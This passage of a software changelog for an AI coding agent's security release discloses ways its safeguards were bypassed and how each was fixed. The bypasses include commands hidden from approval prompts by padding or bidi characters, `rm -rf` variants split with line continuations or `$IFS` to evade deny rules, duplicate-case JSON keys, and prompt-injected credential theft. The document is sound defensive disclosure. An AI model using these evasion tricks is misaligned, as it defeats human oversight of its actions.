  refused before the approval prompt, with the reason, so an approval is
  never spent on a call that cannot succeed.
- The interactive CLI starts in about 50 ms whatever container runtime is
  installed: the sandbox is chosen behind the prompt when the process tier
  meets the configured minimum, and commands wait for the choice. It took
  2.6 s with a podman machine that was not running.
- A model endpoint that is down is named at start-up with what to do, and a
  task fails at once with the same advice. Model errors no longer print a Go
  dial error or the endpoint's response body.
- `abhed -p` exits with 128 plus the stop signal's number (143 for SIGTERM,
  129 for a hang-up) instead of 130 for every signal, as `rpc`, `acp`,
  `eval` and `resolve` already did. `json` output gains a final result line.
- The interactive CLI:
  - Esc stops a running turn and never swallows the next key; Ctrl-C clears
    the line, then stops a turn, and at an empty prompt pressed twice exits.
  - On a terminal the per-reply usage line and the "steering" notices are
    gone: the footer and the input box carry them. Piped sessions print
    them as before.
  - Redraws send only what changed: typing at the end of the line is one
    byte a key where the whole prompt was redrawn before, and a resize
    redraws the screen at the new width rather than leaving the old one's
    rows behind.
  - The startup banner keeps each fact on one row at narrow widths.
- Workspace trust covers `.abhed/agents` with a hash of its own, decided
  apart from `config.json`: the prompt, `abhed trust` and `abhed doctor` show
  each definition's name, model and tools, and declining new definitions
  keeps a file already trusted. A trust record from an earlier version
  decides nothing about definitions, so a workspace without them is not
  asked again. A definition that is a link, has a second name or is larger
  than 64 KiB is refused.
- `agent_type` on `task` and `tasks` is an enum of the session's agent types,
  and the `task` description lists each with when to use it.
- Skills are read by a frontmatter reader shared with agent definitions;
  they parse as before.
- An agent definition's key reads the same quoted or not. A key that reads
  like an honoured one (such as `denied_tools`), or a restriction nested under
  another key, refuses the definition. A managed definition's name stays
  reserved even when that file does not load, and its model binds the call.
  `disallowed_tools` removes every tool a name could mean, `recall` too.
- The event stream of a session with background tasks running stays open
  past its run's end, until the closing end.
- The interactive CLI follows a conversation's events for as long as it is
  open, not per task.

## [1.2.2] - 2026-10-01

### Security

- The /console approval card drew a call's arguments in a box that
  scrolled sideways, so a run of spaces pushed the tail of a command, such
  as `&& tar czf ...`, out of view, and approving ran it. The card now wraps,
  and on the card, /ide's prompt and the terminal prompt a run of eight or
  more columns of spaces or tabs inside a line is shown as a count such as
  `⟨260 spaces⟩` and raises the hidden-characters warning. Indentation after
  a newline is left as it is up to 32 columns. Characters that draw nothing
  (Hangul fillers, braille blank, U+034F, a U+FE0F not after a symbol) are
  now written out as `⟨U+XXXX⟩` like other hidden characters, and /ide shows
  an argument the warning is about when its prompt does not draw it.
  Affects earlier releases.
- Bidi and zero-width characters in a tool call were drawn raw in the /ide
  Events and HawkEYE panels, the HawkEYE HTML report and `abhed hawkeye`,
  so a right-to-left override made `;fs- mr` read as `rm -sf`. These views
  now write them out as `⟨U+XXXX⟩`, as the approval prompts do. The JSON
  report keeps the record's text as it is. Affects earlier releases.
- The interactive terminal, `abhed -p`, `abhed serve` and `abhed eval`
  redacted with the secrets stored when a session started, while bash reads
  the store at each call. A secret stored or changed during a session, and
  allowed by a `secret(...)` rule, was handed to bash and its value reached
  the record and every later model request. These surfaces now follow the
  store as the SDK, `abhed acp` and `abhed rpc` already did: a value is
  redacted from the moment it is stored, and stays redacted once changed or
  removed. Affects earlier releases.
- A backslash-newline line continuation, or an expansion that splits words,
  hid a command from the deny, destructive and ask-rule checks, so bypass
  mode ran `rm \<newline>-rf dir`, `rm -\<newline>rf dir`,
  `git reset \<newline>--hard`, `rm${IFS}-rf${IFS}dir` and `git \<newline>stash`
  past an ask rule for `git stash*`. Every check now also reads the command
  as the shell splits it: continuations joined (outside single quotes, also
  inside a word), `$IFS` and `${IFS...}` read as a space, tabs, carriage
  returns and form feeds as spaces, `$'...'` decoded, and a brace list
  such as `{rm,-rf,dir}` as its words. A program named by an expansion
  (`$x`), or an IFS set to a value and then expanded, always asks. Where
  deny or ask rules are set, a command whose words were split or glued this
  way asks, and no allow rule matches a command that needed more than its
  continuations joined. The prompt still shows the command as written, and
  its reason says when continuations were joined. Affects earlier releases.
- `rm` with its recursive or force flags after an operand (`rm dir -rf`), or
  spelled long (`rm --recursive --force dir`), was not treated as a command
  with no undo, so bypass mode ran it without asking. Those flags now count
  wherever they appear before `--`, long ones by any prefix GNU rm accepts
  (`--rec`, `--forc`). An rm argument holding `$` or a backtick, whose value
  is not known until it runs (`rm $F build`), is asked about too. Affects
  earlier releases.
- A local account could take over another account's sessions by giving
  itself that person's email, or their username, as its own email. The
  server owned a session by the caller's email whenever one was set, and a
  local account's email was neither checked nor unique: the person typed it
  at invite or open sign-up, and an administrator could give two accounts
  the same one. Such an account listed and replayed the other's sessions,
  their subagent records and secrets-bearing transcripts, interrupted them,
  and answered their pending approvals, which ran and were recorded as the
  victim's. Affects every release up to and including 1.2.1 with local
  accounts. Session ownership now comes from one function,
  `auth.Identity.Owner`, for the session list and every per-session route,
  approvals and the approver in the record, subagent rows, stream rechecks
  and audit lines:
  - A local account owns its sessions as `local:<username>`; its email plays
    no part.
  - A single sign-on identity owns them by its email only when the provider
    verified it (OIDC `email_verified: true`, GitHub's verified primary
    email), as before; otherwise by `<provider>:<subject>`.
  - A trusted proxy's request is owned by `X-Abhed-Email` when the proxy
    sends one, with or without `X-Abhed-User`, else by `X-Abhed-User`. A
    request with only an email that is not an address owns nothing, rather
    than every session in the tenant as `anonymous` does.
  - A subject from a proxy or an unnamed provider that reads like another
    namespace (`local:`, `unclaimed:`, `oidc:`, `github:` and the like) is
    moved under its own (`proxy:local:bob`), and an identity whose provider
    names no subject owns nothing.
  - An owner that is an email address is lowercased, so a provider that
    changes the case of an address keeps one owner.
  - A local account's email must be a plain address that no other account
    holds or is named, compared without regard to case, at `user add`,
    invite and open sign-up, and an administrator's account creation.
  Existing session rows are moved or unclaimed once by `abhed migrate`; see
  Upgrading.
- A trusted proxy that named its user `anonymous` (`X-Abhed-User:
  anonymous`) was the owner a request has when authentication is off, which
  owns every session in the tenant: it listed, replayed and answered the
  approvals of everyone's sessions there. A proxy user or unnamed-provider
  subject spelled like an owner with a meaning of its own (`anonymous`,
  `agent`, the owner of the CLI's subagent rows, in any case) is now an
  ordinary user, `proxy:anonymous` or `subject:agent`. Only a request that
  names no one is `anonymous`. A local account of that name was already
  `local:anonymous`. Affects earlier releases.
- A request that names no one who can own a session (a proxy's email that is
  not an address, a provider that sent no subject) is refused with 401 on
  every `/v1/` route, rather than creating sessions it could never open.
- A local account made under the name or email of one that was removed
  inherited the removed account's agent sessions. Released versions owned a
  session by the account's email, otherwise by its username, so a new
  account given either inherited them. Affects earlier releases. With
  owners now `local:<username>`, the same would hold for a reused username.
  Removing an account (`abhed user remove`, or an
  edition's administrator) now moves the sessions it owned in its tenant to
  `unclaimed:local:<username>` in the same transaction as the delete, and the
  server's running ones with them. No identity owns an unclaimed session; an
  operator gives one back with
  `UPDATE sessions SET user_id = 'local:<username>' WHERE user_id = 'unclaimed:local:<username>'`
  as the owning role. A server that holds the removed account's sessions in
  memory lets go of them without a restart, even when the account was
  removed by another process: with session rows, each held session is
  checked against its row and takes the row's owner; with or without them,
  the sessions are released when the server finds the account gone, or when
  an account made again under the name signs in, which it must before it can
  reach anything.
- A person signed out, removed, taken out of `auth.require_group` or refused
  by an access check kept receiving every event of a session on a
  `GET /v1/sessions/{id}/events` stream opened before, and every byte of a
  terminal on `GET /v1/sessions/{id}/pty/{pty}`, while each new request of
  theirs was refused. Both streams now rerun the request's own authentication
  and the session ownership check while they run: at once when local accounts
  end or change a session on the same server, before any write once the last
  check is 10 seconds old, and on a timer. A refused stream ends with an
  `event: refused`. An edition's own sign-in layer can end streams at once
  with `Server.RecheckStreams`. Affects earlier releases.
- An extension hook's `ask` no longer comes before deny rules and plan
  mode, where it could turn a refusal into a question a person might
  accept; a hook's `allow` is no opinion. A hook can now only tighten a
  decision. Affects earlier releases.
- Approval prompts now show hidden and control characters instead of letting
  them rewrite what is displayed. A tool call's own text could carry a
  carriage return, escape sequence, backspace or zero-width or bidi character
  that redrew the prompt, so `touch pwned #…` read as `$ ls -la` and a write's
  preview hid the line it added. The CLI prompt and tool lines, the console
  and IDE approval cards and the `acp` permission title now print such
  characters as escapes (`\r`, `\x1b`, `⟨U+200D⟩`) and say the call contains
  them. That warning covers every argument, including ones no preview draws,
  and the CLI prompt now previews `k8s_apply`, `task`, `ssh` and `web_fetch`.
  Affects earlier releases.
- In every release up to and including 1.2.1, a repository could ship a
  `.abhed/config.json` that Abhed applied whole in every mode: the CLI,
  `-p`, `acp`, `rpc`, `serve` and `resolve`. Such a file
  could set bypass or auto mode, add allow rules, point a provider's
  `base_url` at another server so the code went there, start `extensions`
  and `mcp` processes, turn `sandbox.allow_network` on or lower
  `sandbox.min_tier`. A workspace's configuration is now untrusted until the
  person trusts its exact contents.
  - Trust is keyed by the workspace's canonical path and the SHA-256 of the
    file, and stored in `~/.abhed/trust.json`, which the agent's tools and
    every sandbox tier already keep the agent out of.
  - An untrusted file contributes only what tightens: deny and ask rules, a
    narrower mode, a stronger sandbox tier, network off, lower limits, a
    stricter syntax check, and turning features off. Every other setting is
    ignored and named on stderr and in `abhed doctor`.
  - Settings under `auth`, `storage` and `server`, whose defaults are the
    loosest values, fail closed: `serve`, `user` and `migrate` refuse to run
    without them.
  - Ignored values are shown with credentials redacted, and text from the
    file is escaped so it cannot draw lines of its own in the prompt.
  - The managed configuration still wins over everything, and the user's own
    `~/.abhed/config.json` is trusted as before.
  - Commands the agent runs on the host no longer inherit
    `ABHED_TRUST_WORKSPACE`.
  - The design and the classification of every setting are in
    `docs/architecture/workspace-trust.md`.
- A skill's pipeline ran its tool steps with no policy, approval or record.
  Affects every release from 0.1.0 through 1.2.1, in the CLI (`abhed` and
  `abhed -p`); the server, console and SDK never ran pipelines. A step called
  the tool directly, so deny and ask rules, plan mode, destructive-command
  confirmation, extension hooks, the monitor, the approver and the `secrets`
  allow rule were all skipped. A step could run `bash`, `write` or any other
  registered tool with arguments templated from the request and from earlier
  steps' output. File-tool path checks and a configured sandbox still
  applied. Nothing about the step reached the record, and a pipeline's model
  steps were sent tool output before secret values were stripped from it.
  Each tool step is now put through the loop that called the skill, as that
  loop's own call is: its policy, hooks, the monitor and the approver, one
  ask at a time across the session, and its session, depth and record. A
  pipeline a subagent starts is judged as that subagent, so a `task` step in
  it is a nested spawn and `nested_subagents` still applies. A step that
  needs approval in a headless run, or with no approver, is refused. Each
  step is recorded with `via` naming the skill's pipeline, which HawkEYE
  shows, and an approval prompt says which pipeline asks. A step's timeout
  starts once it is approved. Model steps and gates get their whole prompt
  with secrets redacted. A pipeline is refused rather than run when no
  session's `skill` call started it, when a step calls the `skill` tool, or
  when it would start beneath another pipeline's step, which bounds
  skill, pipeline and subagent recursion.
- A tool call's arguments could be read one way by policy and another by the
  tool. Policy took the subject from the exact key `command` (or `path`,
  `pattern`, ...), while the tools decode into Go structs, which match keys
  whatever their case and keep the last of a repeated key. So
  `{"command":"echo safe","Command":"touch x"}` was judged, shown for
  approval and recorded as `echo safe`, and ran `touch x`. The same held for
  `write`, `edit` and `read` paths, and a `command` key added to a `write`
  call was judged in place of its path. This got past deny, ask and allow
  rules and the destructive-command confirmation, in every mode, and a
  prompt-injected model can write such arguments. Affected: every release,
  0.1.0 through 1.2.1.
  - Arguments are now decoded once, strictly, before policy. A repeated key,
    two keys that differ only in case (at any depth, with case folded as Go
    folds it), data after the object, or arguments that are not an object
    are refused. Every tool refuses a key spelled like a declared one in
    another case, and an undeclared `command`, `path` or other key policy
    reads. `bash`, `read`, `write`, `edit`, `glob`, `grep` and `todo` drop
    any other key their schema does not name before policy, so they run
    exactly what was judged; the record names the keys dropped.
  - The accepted arguments are re-encoded once. Policy, hooks, the monitor,
    the approver, the record, the transcript and the tool, including what is
    sent to an MCP server or extension, all get those same bytes.
  - A refusal is recorded as a denial at step `args`. The request's `args`
    is `{}` and the arguments as sent are in its `raw_args`, as text, so a
    resumed session replays the call with arguments its provider accepts.
    The model is told the arguments were malformed. A resumed session also
    replays as `{}` any recorded arguments that are not one object.
  - `policy.Evaluate` also denies ambiguous arguments at step `args` for
    callers outside the loop, such as the workbench, and reads a lone key in
    another case as the tool would.
- Sessions started through the SDK did not redact stored secrets. In 1.2.1
  and earlier, `sdk.New` built its recorder with no redactor, so a value from
  the secrets store (`abhed secret`) that appeared in a tool's output, or in
  a call the model made, was kept as it was. This affected every session run
  on the SDK: embedded agents, `abhed acp`, `abhed rpc` and `abhed resolve`.
  The value could appear in:
  - the event record (`Events`, `ExportHTML`, the `rpc` export);
  - `OnEvent`, the `rpc` event lines and the `session/update` stream sent to
    an ACP editor;
  - ACP permission requests and the arguments passed to `Approve`;
  - the answer from `Run` and `rpc`, `ErrNoResult.LastMessage` from
    `RunJSON`, and the agent's messages that `resolve` prints;
  - the tool output sent back to the model.

  The terminal, the server and console, and `abhed eval` were not affected.
  SDK sessions now redact with the same store as the CLI, and there is no
  option to turn it off. A server built with no `Options.Redact`, or a
  subagent factory with no `Redact`, now redacts too: the server uses the
  secrets store, and the subagent redacts as its parent does. The `abhed`
  binary always set both, so this only affects a program that embeds these
  packages.
- A secrets store that existed but could not be loaded made every path, the
  CLI included, run with nothing to redact. That covers a store that was
  empty (0 bytes), corrupt, readable by others or unreadable. Now the
  terminal, the server, `eval`, `acp`, `rpc`, `resolve` and the SDK refuse
  to start with an error that names the file and the fix, and `abhed doctor`
  reports the store as not ready. A missing store still means no secrets.
  If the store breaks while `abhed serve` runs, each new session starts but
  withholds every event payload, and the server logs why, until the file is
  fixed; a server built with no `Options.Redact` does the same. See
  Upgrading.
- The store is now opened once and checked on the open file. A FIFO or
  device at its path is refused instead of blocking or reading without end,
  and a store over 1 MiB is refused.
- `abhed serve` read the store once at start, so a secret added while it ran
  was not redacted until a restart. Each server session now reads the store
  when it starts. CLI subagents redact with their conversation's reading
  rather than the one taken when the process started.
- `web_search` sent its query to the search provider as the model wrote
  it, so a stored secret in the query, whether a prompt injection put it
  there or the model did, reached the provider's logs although the record
  showed `[secret:NAME]`. A query that holds a stored value, as written,
  percent-encoded or in another case, is now refused before any request,
  naming the secret and never its value, and a store that cannot be read
  refuses every query, as `web_fetch` does for a URL. Affected: 1.0.0,
  which added the secrets store, through 1.2.1.
- A `write` or `edit` whose path held a stored secret ran as asked, in
  auto, accept-edits and bypass modes without a prompt, so the value became
  a file name anyone who can list the directory reads. Such a call is now
  refused, naming the check and the secret, whether the agent makes it or a
  person at the workbench does: the editor's save and the explorer's New
  file, New folder and Rename (its new name) are checked too. `bash` is not
  checked, so a command can still create such a file. The path is
  matched as written, in its case, against stored values of 12 characters
  or more, so a short value such as `postgres` does not refuse ordinary
  files; a stored value of 8 to 11 characters can still become a file name
  in a mode that approves writes without asking. While the secrets store
  cannot be loaded, every `write` and `edit` is refused. Affects earlier
  releases.
- An SDK session, and so an `abhed rpc` or `abhed acp` session, redacted
  with the values stored when it started, while `bash` reads the store at
  each call. A secret stored during a long session and allowed by a rule
  reached the record, the stream and the model unredacted. SDK redaction
  now reads the store again whenever the file changes (its size, times or
  inode), keeps redacting every value it has loaded during the session after
  it is rotated or removed, and withholds every payload while the store
  cannot be loaded.
- The SDK's `Approve` is now given the decision's reason and scope redacted,
  as well as the arguments.
- `abhed secret set` refuses a value under 8 characters. A shorter value
  already stored still has its values redacted, but no longer has matching
  JSON object keys rewritten, which broke decoding events for SDK and `rpc`
  readers.
- A cluster login or SSH host added during a conversation belonged to the
  whole process, not the session. On `abhed serve`, where every user's
  sessions share one process, one user's `k8s_login` token became the
  credential every other user's `k8s_get` and `k8s_apply` used, and a host
  one session added with `ssh_connect` could be run on from every session,
  or replace an operator's host of the same name for all of them. The token
  was also an argument to `k8s_login`, so it was kept in the record's
  `action.requested`, and from there in exports, the event stream, the
  console, OTLP and HawkEYE, shown in the approval prompt, and sent back to
  the model on every turn. `k8s_login` also sent the token to whatever
  server URL the model gave, with TLS verification off, so a
  prompt-injected model could name its own host and a person approving
  what read as a login handed the token over. And `ssh_connect`'s
  `password_env` read any variable in Abhed's own environment, provider
  keys included, as the password for a host the model named, and
  `accept_host_key` let it go to whoever answered. Affected: every release,
  0.1.0 through 1.2.1.
  - A login and a connected host now belong to the conversation that made
    them, its subagents included. They are closed when the session is
    deleted, when the terminal starts another conversation with `/clear` or
    `/resume`, and when a conversation is forked. Both tools refuse when
    there is no session to hold them.
  - `k8s_login` takes `token_secret`, the name of a token stored with
    `abhed secret set`, instead of `token`; `ssh_connect` takes
    `password_secret` instead of `password_env`. Each name needs its own
    `secret(NAME)` allow rule, as a `bash` secret does. Rules apply to the
    whole deployment, so on `abhed serve` any session there may name a
    secret the rules allow; what is per session is the login made with it.
    The tools never ask the model for a value, so the record holds names.
  - A `token` or `password` sent anyway is dropped before policy reads the
    call, and a value where a secret's name belongs is recorded as
    `[withheld: not a secret name]`. Arguments to either tool refused as
    malformed are not kept in `raw_args`. A value the model writes where
    nothing expects one, such as in `cluster`, `namespace`, a dropped key's
    name, or a call to a tool this deployment does not have, is still
    recorded as written, as it already stands in the model's own reply;
    paste credentials into `abhed secret set`, not into the chat. The one
    exception is a call to an unknown tool whose name is, ignoring case,
    within one letter of `k8s_login`, `ssh_connect` or another tool that
    takes secrets, contains one of those names, or is within one letter of
    one behind a namespace such as `functions.`, `default_api.` or `mcp__x__`:
    its arguments are recorded as `[withheld: unknown credential tool]`.
  - `k8s_login` takes `cluster`, a name from the new `k8s.clusters`, instead
    of `server`. A URL or an undeclared name is refused before the secret is
    read or any request is made. TLS is verified against the system roots
    plus the cluster's `ca_file` or `k8s.ca_file`, and the server must be
    `https://`. A cluster's `insecure_skip_tls_verify` is config only and is
    named on stderr at start, in `abhed doctor`, in the `abhed serve` banner
    and in the approval prompt.
  - `k8s_get` and `k8s_apply` take `cluster`, a declared cluster the session
    logged in to. A login token goes only on that cluster's own client, never
    on a kubeconfig client, whose TLS settings and exec credential are not
    the ones approved. With one login and no `cluster` or `context`, the
    login is used; with several, the call must name one.
  - A session's logins close their connections when the session is
    deleted or a login is replaced, and idle connections time out.
  - `k8s.clusters` is checked when the configuration loads: names must be
    present and distinct ignoring case, and servers `https://` URLs.
  - The approval prompt's reason, and the new `target` field of
    `action.requested`, name the cluster and server a token goes to and how
    its certificate is checked.
  - `ssh_connect` sends a stored password only to a host whose key is
    already in `known_hosts`, and refuses one with `accept_host_key`.
  - `ssh_connect` refuses a name an operator's `ssh.hosts` entry uses, in
    any case, and a name that is not plain ASCII. The approval for an `ssh`
    command names the account and address it runs on, which is what to
    check: ASCII look-alikes such as `pr0d` still pass as names.
  - The approval for a `k8s_apply` write names the cluster, its server, and
    whether this session's login or a kubeconfig context's own credential
    is used. A user or password written into a server URL is left out, and
    the write goes to the server the approval named even if the kubeconfig
    changes in between. Building it runs nothing: a kubeconfig `exec`
    credential helper runs when a request is first sent, so a call that is
    denied, refused in plan mode or rejected runs no helper.
  - The kubeconfig, `ABHED_K8S_TOKEN` and `ssh.hosts`, `password_env`
    included, are the operator's configuration and work as before.
  - `k8s_get` and `k8s_apply` put the namespace, the name, and an apply's
    kind and apiVersion into the request path as the model wrote them, so
    `namespace: "kube-system/secrets?"` or `name: "../secrets"` reached a
    resource other than the one the call named and its rules judged, and a
    deny on Secrets did not hold. Affected: earlier releases. A namespace
    must now be a namespace name or `*`, a name must be one path segment
    (no `/`, `?`, `#`, `%`, `..`, whitespace or control character), and a
    kind and apiVersion must read as such; anything else is refused at step
    `args` before any rule reads the call or any request is sent. Each
    segment is also escaped in the path, and a label selector is
    query-encoded.
  - A `k8s_apply` manifest that repeated a key in another case was judged
    as one object and applied as another. The rules read the manifest the
    way a Go struct does, ignoring case and taking the last key, while the
    tool and the API server read the exact key. So
    `{"kind":"ClusterRoleBinding","Kind":"ConfigMap",...}` passed
    `allow k8s_apply(lab/dev/*)` as a ConfigMap, with no prompt, and wrote a
    ClusterRoleBinding; `metadata` and `namespace` had the same gap. No
    release is affected: 1.2.1 and earlier did not read the manifest for
    the rules. The manifest is now decoded once, strictly:
    a key repeated at any depth, in any case, and `kind`, `apiVersion`,
    `metadata`, `name` or `namespace` spelled in another case, are refused
    at step `args` before any rule reads the call or any request is sent.
    The rules, the approval, the record and the request all use one
    canonical encoding of it, and the bytes sent are the bytes judged.
  - Permission rules and "always allow" read `k8s_login` by its namespace,
    or by nothing when none was given, not by where the token went. A rule
    naming a cluster, such as `deny k8s_login(prod)`, never fired, and
    "always allow" on a login to one cluster offered `k8s_login(NAMESPACE)`
    or the whole tool, and then approved logins to every other cluster
    without asking. `k8s_get` and `k8s_apply` were read by resource and
    action alone, so "always allow" on a write to one cluster covered the
    same write to every cluster. Affected: 0.1.0 through 1.2.1. These tools
    are now read by cluster first: `k8s_login(prod)`,
    `k8s_get(prod/NAMESPACE/RESOURCE)` and
    `k8s_apply(prod/NAMESPACE/ACTION)`, a kubeconfig context as
    `context:NAME`. Each call is first put in the form it runs in, and
    recorded that way, with the arguments Abhed set listed in `resolved`:
    the session's only login as its cluster, the resource's plural
    (`Secret` reads `secrets`), and the namespace it would use when it names
    none, the manifest's for an `apply`. A call on every namespace (`*`) is
    matched by a deny or ask rule on any namespace. A cluster-scoped object
    (a namespace, a node, a ClusterRoleBinding and the like) reads as
    `prod/-/ACTION`, so no rule on a namespace covers it, and any namespace
    the call names is dropped. One judged as going to the kubeconfig is
    refused if a login was made in between. See Upgrading.

### Upgrading

- Two migrations stop a server from starting until they have run: the
  session owner migration (schema version 4) and the account key indexes
  (schema version 5). Stop every server on the old release, then run
  `abhed migrate` as the owner, then start this release. `serve` and `user`
  running as the runtime role refuse to start until both have run, and a
  `storage.single_role` server runs both at start. An old node left running
  during a rolling upgrade writes sessions under the old owners after the
  migration, and those sessions are then reachable by no one.
- A relative `auth.users_file` now resolves against the workspace for
  `serve`, `user` and `migrate`, not against the directory each was started
  in. A deployment that relied on the start directory should give the path
  in full.
- Version 5 makes usernames and emails unique without regard to case, on
  Postgres. If two existing accounts already share one, `abhed migrate`
  names them and stops, and runs once all but one have another email or are
  removed. Check for duplicates before the maintenance window, as the owning
  role:
  ```sql
  SELECT lower(username), count(*) FROM users GROUP BY 1 HAVING count(*) > 1;
  SELECT lower(btrim(email)), count(*) FROM users
    WHERE btrim(email) <> '' GROUP BY 1 HAVING count(*) > 1;
  ```
  To fix one, give each extra account another address, or clear it (the
  email grants nothing), for example:
  ```sql
  UPDATE users SET email = 'carol.2@example.com' WHERE username = 'carol2';
  UPDATE users SET email = '' WHERE username = 'old-test-account';
  ```
- The migration looks at each owner key on existing session rows and the
  local accounts **in that row's tenant** whose username or email is that key,
  without regard to case. What it does with a match depends on whether local
  accounts were the only way in, which `abhed migrate` prints and logs:
  - `--owners=local-only`, the default when `auth.mode` is `local` with no
    provider beside it: a key exactly one account holds moves to that
    account (`local:<username>`), so a person keeps the sessions made under
    their email or their name. A key several accounts hold (an account whose
    email was another's name or email) becomes `unclaimed:<old key>`.
  - The accounts it matches against are those in the Postgres `users` table
    and, when `auth.users_file` is set (or the default `users.json` exists),
    those in that file, one per username, each in its own tenant. `abhed
    migrate` prints how many it found and where. Under `local-only` with no
    account found while sessions under old owners exist, it refuses, since
    every one of them would be stranded; pass `--owners=unclaim` or
    `--force-no-accounts` to go on anyway.
  - `--owners=unclaim`, the default for every other `auth.mode` (`proxy`,
    `oidc`, local with a provider, or none): every matching key becomes
    `unclaimed:<old key>`. A proxy user or single sign-on identity could have
    written under that name or address, which a local account may merely have
    typed, so no row is given to an account. Pass `--owners=local-only` only
    if you know local accounts wrote every such row.
  - Unclaimed rows cannot be opened through the session API (and the CLI
    will not resume one, whatever `$USER` is); administrators see their
    events in the audit. The migration logs each
    key with its tenant and the accounts it matched. An operator who knows
    the owner moves them with
    `UPDATE sessions SET user_id = 'local:<username>' WHERE user_id = 'unclaimed:<old key>'`
    as the owning role (run `ALTER TABLE sessions NO FORCE ROW LEVEL SECURITY`
    first and `FORCE` after, or it sees one tenant only).
  - A key no account in the row's tenant names is left alone: single sign-on,
    proxy, CLI and schedule rows keep their owner, except that an OIDC
    identity whose provider does not send `email_verified: true` is now owned
    by `oidc:<subject>`, so its sessions from before stay under its email.
  - Rows owned by `anonymous` and the CLI's subagent rows (`agent`) never
    move, even to an account of that name.
  - The default policy reads the configuration `abhed migrate` runs with.
    If anything other than local accounts has ever signed people in to this
    database, pass `--owners=unclaim`, whatever `auth.mode` says now.
  - Rows written by a proxy or unnamed-provider subject that begins with a
    reserved prefix (`local:`, `unclaimed:`, `oidc:` and the like), or is
    `anonymous` or `agent` in any case, are not migrated. That caller now
    owns new sessions under `proxy:` or `subject:`; its old rows stay under
    the old key, and an operator moves them by hand if they are wanted.
  - A key no account in the row's tenant names, but an account in another
    tenant does, is left alone and logged: a custom tenant resolver may have
    written that account's rows outside its `users.tenant`.
  Under `local-only`, a session the CLI recorded under an OS user name that
  is also an account's name moves to that account, and the CLI still resumes
  it. The event record is append-only and keeps the approver names it was
  written with.
- Workspace configuration files are untrusted after the upgrade, including
  ones you wrote yourself. Until you trust a workspace's
  `.abhed/config.json`, only its tightening settings apply, and a warning
  names every setting that was ignored. The first interactive `abhed` in each
  such workspace asks once, lists what the file would change, and offers to
  trust it, not trust it, or show it. Elsewhere:
  - Run `abhed trust` in the workspace to see the file and what it would
    change, then `abhed trust grant` to trust it.
  - A deployment or CI job that keeps its settings (storage, auth, providers,
    MCP servers, extensions) in the workspace file must either run `abhed
    trust grant` once as the user it runs as, or start with
    `-trust-workspace` (before the subcommand, or as the first argument
    after it) or
    `ABHED_TRUST_WORKSPACE=1`. If an untrusted file sets anything under
    `auth`, `storage` or `server`, `abhed serve`, `abhed user` and `abhed
    migrate` refuse to start and say how to go on, rather than run with no
    sign-in or an in-memory record. Every other command goes on without
    the ignored settings, with a warning on stderr: a headless run (`-p`,
    `rpc`, `acp`, `resolve`) uses the built-in or user default model and
    endpoint instead of the file's, without its MCP servers and extensions,
    and in the default mode instead of the file's. A CI job can therefore
    run a different model with fewer tools and still exit 0. A failed run
    repeats that the file's model settings were ignored.
  - Grants are stored in `~/.abhed/trust.json` of the user who runs Abhed.
    In a container or CI runner whose home directory does not persist, a
    grant is lost with it: use `-trust-workspace` or
    `ABHED_TRUST_WORKSPACE=1` for that step, or move the settings to the
    managed file. Set the variable for a single step, not in a shell
    profile.
    Settings kept in `~/.abhed/config.json` or the managed
    `/etc/abhed/config.json` are unaffected.
  - Editors on ACP: `session/new` now reports the decision in
    `_meta.abhed.workspaceTrust`.
- The same migration lowercases every session owner that is a plain email
  (an `@` and no `:`), in every tenant, with the same fold the server applies
  to a caller, because an owner email is now
  compared in lower case: a single sign-on or proxy identity whose provider
  sent `Alice@Example.COM` keeps the sessions stored under that spelling.
  Rows under several spellings of one address become one owner, and the
  migration logs each such address with the spellings it merged. Namespaced
  owners (`local:`, `unclaimed:`, `oidc:`, `github:`) and non-address owners
  are left as they are.
- The approver in the record, the `by` of administrative audit lines and the
  `user` of a session in `GET /v1/sessions` are now the owner above, such as
  `local:alice`, not the email. `/v1/whoami` returns it as `owner`.
- `auth.Identity` has `Provider` and `EmailVerified`. An embedding
  application's own `auth.Provider` that does not set them is owned by the
  identity's subject, never its email.
- Existing local accounts keep whatever email they have, even an invalid
  one; it no longer grants anything. In a users file a duplicate email is
  kept too. On Postgres a username or email that two accounts share, without
  regard to case, stops `abhed migrate` until it is resolved (see the first
  item).
- `tasks` with `"isolation": "worktree"` now counts as a mutating call: it
  asks in default mode, is refused in plan mode, and is refused where nobody
  can be asked (`-p`, `rpc`, unattended server runs) unless an allow rule
  names `tasks`. A script that relied on `-p` making worktrees needs
  `-allow tasks` or the rule in its configuration.
- `rm` with an argument holding `$` or a backtick (`rm $F build`) is now
  treated as a command with no undo, so it asks, in bypass mode too, and is
  refused where nobody can be asked.
- A command whose program is named by an expansion (`$x args`), or that sets
  IFS and then expands it, always asks. Where deny or ask rules are set, a
  command whose words were split or glued by line continuations, `$IFS`,
  `$'...'` or brace lists asks, and an allow rule no longer matches a
  command that needed more than its continuations joined. Unattended scripts
  that run such commands need rewriting in plain form.
- A request that names no one who can own a session (a proxy's
  `X-Abhed-Email` that is not an address with no `X-Abhed-User`, or a
  provider that sends no subject) is refused with 401 on every `/v1/` route.
  Check a proxy's headers before upgrading.
- `abhed rpc` and `abhed acp` sessions now have the CLI's tool set: they
  start the MCP servers and extensions a trusted workspace configuration
  names, load its skills, and can run subagents. A CI job on `abhed rpc`
  whose configuration names a server or extension it never started before
  now starts it.
- `Postgres.CreateSubagentSession` records a subagent's row with its
  parent session's id; `CreateSubSession` is unchanged and records none.
  `ListSessions` leaves out rows with a parent
  and returns `ParentID`; deleting a session marks its subagents' rows
  deleted too.
- `url` is now a policy subject for MCP and extension tools. A tool whose
  only subject-like argument is `url` is matched on that URL, so deny and
  ask rules written as `mcp__x(https://…/*)` that never fired now do, and an
  allow rule written that way now approves calls it did not before. Re-read
  such rules before upgrading.
- An argument named `url` that a tool's schema does not declare is now
  refused, as the other subject keys are, rather than passed through.
- ACP editors must answer a permission request with one of the option ids it
  offers. The ids are no longer the fixed `once`, `always` and `reject`; they
  are bound to the request, and any other answer is refused. An editor that
  picks from the offered options, as the protocol intends, needs no change.
- A cancelled or unreadable ACP editor reply is now recorded `by: system`
  with its reason, not as a reviewer's denial. A request whose recorded copy
  was withheld is refused without asking and recorded the same way.
- An ACP editor that read the tool name from a `tool_call` update's root
  `name` field reads it from `_meta["zybuu.ai/abhed"].tool`. The spec does not
  allow custom root fields.
- A secrets store that exists but cannot be loaded now stops sessions from
  starting: the terminal and `-p`, `abhed serve`, `eval`, `acp`, `rpc`,
  `resolve` and `sdk.New` all refuse. Before upgrading, run `abhed doctor`
  from 1.2.2: it reports the store and exits 1 without starting anything.
  The fix depends on the case:
  - readable by others: `chmod 600` the file;
